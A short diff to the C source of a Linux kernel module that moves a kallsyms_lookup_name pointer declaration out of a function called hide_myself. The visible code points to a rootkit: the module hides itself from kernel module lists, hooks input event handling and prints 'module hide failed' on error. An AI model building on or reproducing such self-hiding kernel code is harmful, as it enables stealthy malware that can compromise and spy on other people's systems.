@@ -46,6 +46,8 @@ static struct miscdevice dispatch_misc_device;
 static void (*my_input_handle_event)(void *dev,
 							   unsigned int type, unsigned int code, int value) = NULL;
 
+unsigned long (*kallsyms_lookup_name)(const char *name);
+
 static void __init hide_myself(void)
 {
     struct vmap_area *va, *vtmp;
@@ -54,7 +56,7 @@ static void __init hide_myself(void)
     struct rb_root *_vmap_area_root;
 
 #ifdef KPROBE_LOOKUP
-    unsigned long (*kallsyms_lookup_name)(const char *name);
+    
     if (register_kprobe(&kp) < 0) {
 	printk("driverX: module hide failed");
         return;
